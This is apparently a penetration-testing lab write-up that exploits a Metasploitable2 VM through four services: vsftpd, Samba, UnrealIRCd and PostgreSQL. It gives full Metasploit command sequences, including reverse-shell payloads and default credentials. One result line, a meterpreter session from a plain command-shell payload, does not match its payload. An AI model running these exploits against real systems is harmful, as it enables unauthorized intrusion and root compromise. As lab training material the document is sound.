# Four Vectors, One Target: Comparing Independent Exploitation Paths on Metasploitable2

**Track:** eJPT prep — Host/Network Pentesting module
**Lab:** Isolated VirtualBox host-only network (vboxnet0)
**Attacker:** Kali VM — 192.168.56.102
**Target:** Metasploitable2 — 192.168.56.101 (Ubuntu 8.04, kernel 2.6.24-16-server, i686)

## Scope

All testing performed in an isolated, self-hosted lab against Metasploitable2,
a deliberately vulnerable training VM. No production or third-party systems
were involved.

## Objective

Metasploitable2 exposes a large attack surface — 28 open ports against a
hardened comparison target's 4. Rather than treat "got a shell" as the
finish line on a single service, this piece walks four independent
exploitation paths against four different services, chosen specifically to
cover **four different vulnerability classes** rather than four variations
of the same bug type. The result: three full root compromises and one
service-level foothold — a more realistic spread than uniform success would
be.

## Vector 1 — vsftpd 2.3.4 backdoor (CVE-2011-2523)

**Class:** Intentional backdoor in a compromised source distribution.

A username containing the literal string `:)` triggers a listener on port
6200 that hands back a shell — not a bug, a deliberately inserted trojan in
that specific release's tarball.

**Confirmed before exploiting:**
```bash
searchsploit vsftpd 2.3.4
searchsploit -x unix/remote/49757.py
```

**Exploitation:**
```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.56.101
msf6 > set payload cmd/unix/interact
msf6 > set LHOST 192.168.56.102
msf6 > run
```

**Result:** root (meterpreter).

## Vector 2 — Samba `usermap_script` (CVE-2007-2447)

**Class:** Unsanitized input reaching a shell command — classic command
injection, architecturally unrelated to vsftpd's backdoor.

The `usermap_script` username-mapping feature passes attacker-controlled
input straight into a shell command via `mkuser.sh`, with no sanitization.

**Exploitation:**
```
msf6 > use exploit/multi/samba/usermap_script
msf6 > set RHOSTS 192.168.56.101
msf6 > set payload cmd/unix/reverse
msf6 > set LHOST 192.168.56.102
msf6 > run
```

**Result:** root (raw shell). Verified against Vector 1 as the same
underlying system via matching `md5sum /etc/shadow`
(`ccbef84a758831685f9f4fb89382ebdf`) across both sessions.

## Vector 3 — UnrealIRCd backdoor (CVE-2010-2075)

**Class:** Intentional backdoor, same category as vsftpd but a distinct
mechanism — embedded in the IRC protocol handshake rather than triggered by
a connection-time string.

The trojaned `Unreal3.2.8.1.tar.gz` distribution accepts a hidden trigger
string (`AB;` followed by a shell command) early in an IRC connection and
executes it directly, with no authentication.

**Exploitation:**
```
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 > set RHOSTS 192.168.56.101
msf6 > set RPORT 6667
msf6 > set payload cmd/unix/reverse
msf6 > set LHOST 192.168.56.102
msf6 > run
```

**Result:** root (raw shell), confirmed via `whoami` / `id`.

## Vector 4 — PostgreSQL default credentials (credentialed RCE)

**Class:** Not a code vulnerability or a backdoor at all — legitimate
database functionality (dynamic function creation) abused once valid
credentials are obtained. The most realistic real-world entry vector of the
four: weak/default credentials, not a CVE.

**Confirmed credentials before exploiting:**
```
msf6 > use auxiliary/scanner/postgres/postgres_login
msf6 > set RHOSTS 192.168.56.101
msf6 > run
```
`postgres:postgres` confirmed valid.

**Exploitation:**
```
msf6 > use exploit/linux/postgres/postgres_payload
msf6 > set RHOSTS 192.168.56.101
msf6 > set USERNAME postgres
msf6 > set PASSWORD postgres
msf6 > set target 0
msf6 > set LHOST 192.168.56.102
msf6 > run
```

**Result:** meterpreter session as **`postgres`**, not root — confirmed via
`getuid` and `sysinfo` (which also surfaced a more specific OS
attribution — Ubuntu 8.04 — than the kernel string alone gave for the other
three vectors).

This is the one path of the four that did **not** result in full root. Left
as-is rather than chased into privilege escalation, both because the
enumeration → escalation skill was already exercised separately (see the
[Day 18 privesc writeup](metasploitable2-udev-privesc-attempt.md)) and
because a foothold-not-root outcome is itself a useful, honest data point —
not every entry vector needs to end the same way to be a valid result.

## Vulnerability class comparison

| Vector | Class | Auth required | Result |
|---|---|---|---|
| vsftpd | Backdoor (connection trigger string) | No | root |
| Samba | Input → command injection | No | root |
| UnrealIRCd | Backdoor (protocol-embedded trigger) | No | root |
| PostgreSQL | Legitimate feature + weak creds | Yes (default creds) | postgres (foothold) |

## Takeaways

- **"Vulnerable service" isn't one thing.** These four failures span
  supply-chain compromise, input validation failure, and credential
  hygiene — a single patching strategy wouldn't address all four the same
  way.
- **Weak credentials remain a distinct, common real-world path** even on a
  box otherwise full of code-level bugs — and notably, it's the one vector
  here that didn't hand over root outright, which is itself realistic:
  credentialed access often lands you at a service account, not
  immediately at the top.
- **Cross-session verification (matching `/etc/shadow` hashes) is a cheap,
  concrete way to prove multiple vectors are hitting the same target**, worth
  doing whenever a writeup claims several independent paths on one host.
- **Not forcing every path to root is more honest than it might seem** — a
  mixed result set (3 root, 1 foothold) more accurately reflects how varied
  real engagements actually go than uniform success would.

## Next steps

This closes out the Metasploitable2 exploitation reps for this track.
Moving to Nmap fingerprinting depth next, then web interface attacks
(Burp Suite/DVWA), then eJPT cert prep proper.
